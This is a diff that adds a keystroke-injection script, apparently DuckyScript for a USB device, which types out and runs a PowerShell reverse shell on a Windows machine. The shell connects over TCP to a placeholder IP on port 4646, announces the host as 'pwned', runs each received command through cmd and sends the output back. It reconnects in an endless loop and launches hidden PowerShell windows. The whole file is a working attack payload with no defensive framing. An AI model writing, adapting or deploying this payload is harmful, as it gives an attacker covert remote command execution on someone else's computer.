@@ -1,0 +1,124 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 7000
+STRING $firstConnection = $true
+ENTER
+DELAY 500
+STRING while ($true) {
+ENTER
+DELAY 500
+STRING try {
+ENTER
+DELAY 500
+STRING $client = New-Object System.Net.Sockets.TCPClient('192.168.X.X', 4646)
+ENTER
+DELAY 500
+STRING $stream = $client.GetStream()
+ENTER
+DELAY 500
+STRING $hostname = $(hostname)
+ENTER
+DELAY 500
+STRING $pwnedMessage = "[*] $hostname> pwned"
+ENTER
+DELAY 500
+STRING $shellMessage = "[*] Write or press enter to activate the remote shell. NOTE: Wait 13 seconds before the reverse shell is fully opened"
+ENTER
+DELAY 500
+STRING if ($firstConnection) {
+ENTER
+DELAY 500
+STRING $stageMessage = "[*] sending stage0 reverse shell payload"
+ENTER
+DELAY 500
+STRING $loadedMessage = "[*] stage0 payload loaded! - Payload loaded!"
+ENTER
+DELAY 500
+STRING $messages = $pwnedMessage, $stageMessage, $loadedMessage, $shellMessage
+ENTER
+DELAY 500
+STRING foreach ($message in $messages) {
+ENTER
+DELAY 500
+STRING $messageBytes = [text.encoding]::ASCII.GetBytes($message + "`n")
+ENTER
+DELAY 500
+STRING $stream.Write($messageBytes, 0, $messageBytes.Length)
+ENTER
+DELAY 500
+STRING }
+ENTER
+DELAY 500
+STRING $stream.Flush()
+ENTER
+DELAY 500
+STRING $firstConnection = $false
+ENTER
+DELAY 500
+STRING }
+ENTER
+DELAY 500
+STRING [byte[]]$bytes = 0..65535|%{0}
+ENTER
+DELAY 500
+STRING $firstCommandReceived = $false
+ENTER
+DELAY 500
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+ENTER
+DELAY 500
+STRING if (-not $firstCommandReceived) {
+ENTER
+DELAY 500
+STRING $firstCommandReceived = $true
+ENTER
+DELAY 500
+STRING powershell.exe -windowstyle hidden -command "& { Start-Sleep -Seconds 10; Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command Start-Sleep -Seconds 10; echo Proceso en segundo plano' -NoNewWindow }"
+ENTER
+DELAY 500
+STRING }
+ENTER
+DELAY 500
+STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+ENTER
+DELAY 500
+STRING $sendback = (cmd /c $data 2>&1 | Out-String)
+ENTER
+DELAY 500
+STRING $prompt = "CMD " + (pwd).Path + "> "
+ENTER
+DELAY 500
+STRING $sendback2 = "[*] " + $sendback + "`n" + $prompt
+ENTER
+DELAY 500
+STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+ENTER
+DELAY 500
+STRING $stream.Write($sendbyte, 0, $sendbyte.Length)
+ENTER
+DELAY 500
+STRING $stream.Flush()
+ENTER
+DELAY 500
+STRING }
+ENTER
+DELAY 500
+STRING $client.Close()
+ENTER
+DELAY 500
+STRING }
+ENTER
+DELAY 500
+STRING catch {
+ENTER
+DELAY 500
+STRING Start-Sleep -Seconds 5
+ENTER
+STRING }
+ENTER
+DELAY 500
+STRING }
+ENTER
